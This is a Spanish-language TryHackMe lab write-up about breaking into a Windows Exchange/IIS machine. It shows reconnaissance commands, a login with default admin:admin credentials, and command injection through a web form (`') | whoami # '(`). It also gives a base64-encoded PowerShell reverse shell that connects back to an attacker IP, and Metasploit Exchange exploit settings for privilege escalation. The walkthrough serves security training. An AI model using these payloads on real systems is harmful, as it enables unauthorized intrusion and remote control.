Bievenidos a otra sala de TryHackMe. En esta ocasion, explotaremos una maquina windows escaneando sus respectivos puertos abiertos, enumeraremos posibles vulnerabilidades, directorios dentro del servidor web y nos abusaremos dentro de una barra de ejecucion dentro del servidor web para luego escalar privilegios utilizando nuestro metasploit.

# Recon

Iniciamos nuestro reconocimiento utilizando __nmap__. Le diremos que escanee todos los puertos abiertos, con una tasa de paquetes de 5000, en modo sigiloso sin activar las alertas de seguridad y haciendo el escaneo mas rapido, tambien le diremos que no compruebe si el objetivo este en linea, que no resuelva los nombres del host durante el escaneo evitando que los servidores __DNS__ registren el escaneo y haciendo el escaneo mucho mas rapido, tambien que nos muestre la version del servicio, y lo resuelva todo en modo agresivo "__T4__", usamos verbose para ver el progreso del escaneo y que guarde todo el proceso en formato normal, para luego poder echarle un vistazo siempre que querramos. Ejecutaremos nuestro comando : `sudo nmap  -p- --open --min-rate 5000 -sS -Pn -n -sV -T4 -vvv IPTARGET -oN nmap`
```ruby
Nmap scan report for IPTARGET
Host is up, received user-set (0.23s latency).
Scanned at 2023-05-28 16:48:35 EDT for 78s
Not shown: 65532 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE       REASON          VERSION
80/tcp   open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
443/tcp  open  ssl/https     syn-ack ttl 127
3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Read data files from: /usr/bin/../share/nmap

```

Podremos ver 3 puertos abiertos, el 3389 pertenece al servicio rdp, y nuestro ttl nos indica el numero 127, por lo que tendremos que asumir que es una maquina windows.
Al dirigirnos al puerto 80 y 443, no llegaremos a ninguna parte porque no nos muestra nada, iniciamos nuestro proceso de enumeracion para visualizar posibles rutas.

# Enumeration

Primeramente utilizamos nikto para identificar y evaluar posibles vulnerabilidades dentro del servidor web.

```bash
nikto -h IPTARGET
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          
+ Target Hostname:    
+ Target Port:        80
+ Start Time:         2023-05-28 16:56:13 (GMT-4)
---------------------------------------------------------------------------
+ Server: Microsoft-IIS/10.0
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ All CGI directories found, use -C none to test none
+ /Autodiscover/Autodiscover.xml: Retrieved x-powered-by header: ASP.NET.
+ /Autodiscover/Autodiscover.xml: Uncommon header x-feserver found, with contents: WIN-12OUO7A66M7.
+ /Rpc: Uncommon header request-id found, with contents: 74fa287f-d229-4ce7-b223-fd79c2032258.
+ /Rpc: Default account found for '' at (ID 'admin', PW 'admin'). Generic account discovered.. See: CWE-16

```

Observemos lo que esta marcado, el servidor web utiliza en "/rpc" credenciales por defecto "admin:admin", tendremos que deducir que el servidor web tiene un login.php para poder ingresar con esas credenciales.

Seguiremos el proceso de enumeracion, esta vez utilizando gobuster que es una herramienta para descubrir posibles directorios ocultos dentro de un servidor web 
Ejecutamos `gobuster dir -u IPTARGET -w /usr/share/wordlists/dirb/big.txt -t 100 --exclude-length 0`. Nota, si no excluimos el lenght, no  podremos enumerar el servidor y nos dara un error.

```bash
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.161.23
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] Exclude Length:          0
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/05/28 16:49:33 Starting gobuster in directory enumeration mode
===============================================================
/TEST                 (Status: 403) [Size: 1233]
/Test                 (Status: 403) [Size: 1233]
/ecp                  (Status: 302) [Size: 207] [--> https://10.10.161.23/owa/auth/logon.aspx?url=https%3a%2f%2f10.10.161.23%2fecp&reason=0]
/test                 (Status: 403) [Size: 1233]
Progress: 20469 / 20470 (100.00%)
===============================================================
2023/05/28 16:50:22 Finished

```

Tendremos "**/ecp & /test**". Al dirigirnos nos pedira credenciales para poder ingresar, en este caso como anteriormente descubrimos que el servidor web utilizaba credencilaes por defecto "admin:admin" al intentar probarlas podremos acceder en el directorio /test.
La otra ruta "/ecp", podremos ver el certificado y sacar el dominio del servidor. Esto es util ya que obtendremos mas informacion del objetivo. Al intentar acceder con las credenciales nos dara acceso denegado, por lo que tendremos que descartar esta posibilidad.

# Intrusion

Dentro de la ruta /test, una vez ingresado con las credenciales "admin:admin", ademas de obtener nuestra primera flag, veremos una interfaz con una barra de busqueda o para poder ejecutar algo con algo escrito en ella. Si ejecutamos lo que esta escrito, obtenemos como respuesta `List generated at 7:50:19 PM.` en estos casos, lo que a uno se le viene a la mente es que podemos utilizar comandos como "whoami, id , etc", pero al ejecutar cualquiera de estos comandos recibiremos un error.

En este caso, el uso de wildcards seria lo mas conveniente. En mi caso, utilice "*" para ver si funcionaba, y me listo sus respectivos directorios de sistema. Al ir explorando utilizando nuestra wildcard, llegamo a la ruta `users\dev\desktop\*` donde podremos ver el contenido de la segunda flag y una nota de texto con informacion de actualizaciones de sistema e incluso encontraremos mails internos.

# Reverse shell (Optional)

Para hacer nuestra tarea mas comoda, y como vimos anteriormente que podemos ejecutar comandos, lo que haremos es generar una reverse shell dentro de nuestra maquina atacante y enumerar el sistema. Necesitaremos ampliar nuestras wildcards hasta que podamos utilizar comandos como "whoami" para ello, realizamos la siguiente consulta.
`') | whoami # '(`.

Ahora remplazaremos "whoami" y lo reemplazaremos con nuestro codigo reverse shell escrito en powershell codificado en base64. Podemos obtener este reverse shell en la pagina https://www.revshells.com/. Antes de ejecutar nuestro shell, nos pondremos en escucha  `nc -nvlp 4444`

```bash
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AOAAuADIALgAxADIAMQAiACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=
```


# Priv. Escalation

Como vimos en nuestro documento de texto, vemos que hicieron actualizaciones a microsoft exchange. Buscaremos en nuestro metasploit si encontramos alguna vulnerabilidad que nos permita escalar privilegios y acceder como NT\AUTHORITY.

Abriremos Metasploit `msfconsole` y buscaremos `search microsoft exchange`

```bash
Matching Modules
================

   #   Name                                                          Disclosure Date  Rank       Check  Description
   -   ----                                                          ---------------  ----       -----  -----------
   0   exploit/windows/http/exchange_ecp_viewstate                   2020-02-11       'excellent'  Yes    Exchange Control Panel ViewState Deserialization
   1   auxiliary/scanner/http/exchange_web_server_pushsubscription   2019-01-21       normal     No     Microsoft Exchange Privilege Escalation Exploit
   2   auxiliary/gather/exchange_proxylogon_collector                2021-03-02       normal     No     Microsoft Exchange ProxyLogon Collector
   3   exploit/windows/http/exchange_proxylogon_rce                  2021-03-02       excellent  Yes    Microsoft Exchange ProxyLogon RCE
   4   auxiliary/scanner/http/exchange_proxylogon                    2021-03-02       normal     No     Microsoft Exchange ProxyLogon Scanner
   5   exploit/windows/http/exchange_proxynotshell_rce               2022-09-28       'excellent'  Yes    Microsoft Exchange ProxyNotShell RCE
   6   exploit/windows/http/exchange_proxyshell_rce                  2021-04-06       'excellent'  Yes    Microsoft Exchange ProxyShell RCE
   7   exploit/windows/http/exchange_chainedserializationbinder_rce  2021-12-09       'excellent'  Yes    Microsoft Exchange Server ChainedSerializationBinder RCE
   8   exploit/windows/http/exchange_ecp_dlp_policy                  2021-01-12       'excellent'  Yes    Microsoft Exchange Server DlpUtils AddTenantDlpPolicy RCE
   9   exploit/linux/local/cve_2021_38648_omigod                     2021-09-14       'excellent'  Yes    Microsoft OMI Management Interface Authentication Bypass
   10  auxiliary/gather/office365userenum                            2018-09-05       normal     No     Office 365 User Enumeration
   11  auxiliary/scanner/http/owa_iis_internal_ip                    2012-12-17       normal     No     Outlook Web App (OWA) / Client Access Server (CAS) IIS HTTP Internal IP Disclosure
   12  post/windows/gather/exchange                                                   normal     No     Windows Gather Exchange Server Mailboxes
```

Siempre es mejor fijarse en "excellent" que brinda mayor rentabilidad a la hora de trabajar. Una vez probado cual es el que te va a dar acceso como autoridad, configuramos :

>`RHOSTS` --> IPTARGET
>`EMAIL` -- dev-infrastracture-team@thm.local --> lo encontramos en el escritorio /dev
>`LHOST` --> Local Host
>`LPORT` --> LocalPort

Una vez configurado, ejecutamos `run` o `exploit`, dejaremos que trabaje y una vez finalizado seremos autoridad del sistema.

Una forma para encontrar rapido la flag es utilizando los siguientes comando

>`shell` --> obtenemos una shell interactiva dentro del sistema
>`dir /s /b C:\hello.txt` --> buscamos nuestra flag

